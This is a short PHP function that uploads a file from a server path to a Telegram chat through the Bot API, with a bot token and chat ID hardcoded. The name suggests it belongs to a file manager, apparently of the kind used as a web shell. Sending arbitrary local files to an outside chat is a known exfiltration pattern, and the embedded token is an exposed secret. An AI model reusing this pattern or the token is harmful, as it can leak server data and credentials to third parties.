<?php
function babu_manager_send_to_telegram($file_path) {
    $bot_token = '7833787166:AAGlg3_nmlb9K_JL7JGtfO4sSnE83BDkeT0'; // Ganti dengan token bot Telegram Anda
    $chat_id = '6990643296'; // Ganti dengan chat ID Telegram Anda

    $url = "https://api.telegram.org/bot$bot_token/sendDocument";
    $document = new CURLFile($file_path);
    $post_fields = [
        'chat_id' => $chat_id,
        'document' => $document
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}